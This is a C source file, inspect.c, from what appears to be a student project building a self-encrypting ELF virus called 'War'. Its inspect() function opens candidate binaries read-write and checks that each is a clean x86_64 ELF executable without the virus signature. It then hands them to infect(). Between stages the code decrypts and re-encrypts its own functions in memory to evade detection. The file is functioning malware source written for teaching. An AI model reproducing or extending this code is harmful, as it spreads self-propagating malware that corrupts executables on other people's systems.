/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inspect.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/31 19:28:21 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/20 19:47:49 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Inspect() verify that selected binary is a clean, executable, x86_64 binary etc.
*/

__INLINE__ static bool is_corrupted(t_data *data)
{
	if (data->bin.size < 64)
		return (true);
	return (data->header->e_shoff + (data->header->e_shnum * sizeof(Elf64_Shdr)) != data->bin.size);
}

__INLINE__ static bool is_elf(t_data *data)
{
	return (*(uint32_t *)data->header == ELF_MAGIC_NUMBER);
}

__INLINE__ static bool is_x64(t_data *data)
{
	return (data->header->e_ident[EI_CLASS] == ELFCLASS64);
}

__INLINE__ static bool is_x86(t_data *data)
{
	return (data->header->e_machine == EM_X86_64);
}

__INLINE__ static bool is_executable(t_data *data)
{
	return (data->header->e_entry != 0);
}

__INLINE__ static bool is_infected(t_data *data)
{
	return ((*(uint32_t*)&data->header->e_ident[EI_PAD] == SIGNATURE));
}

void	inspect(t_data *data, char *path)
{

#ifdef DEBUG
	char log[] = "inspect\t\t";
	_log(log, path, 9, data->context);
#endif

	revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);

	if (data->context != true)
		goto next;

	struct stat st;

	data->context = false;
  	if ((data->bin.fd = _open(path, O_RDWR, 0000)) < 0)
		goto next;

	if (_fstat(data->bin.fd, &st) < 0)
		goto next;

	if (st.st_size < 64)
		goto next;

	if ((data->bin.map = _mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, data->bin.fd, 0)) == MAP_FAILED)
		goto next;

	data->bin.size = st.st_size;
	data->header = (Elf64_Ehdr*)data->bin.map;

	if (is_corrupted(data) == true)
		goto next;
	if (is_elf(data) == false)
		goto next;
	if (is_x64(data) == false)
		goto next;
	if (is_x86(data) == false)
		goto next;
	if (is_executable(data) == false)
		goto next;
	if (is_infected(data) == true)
		goto next;

	data->context = true;
	data->name = path;

next:
	update_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
	infect(data);
}
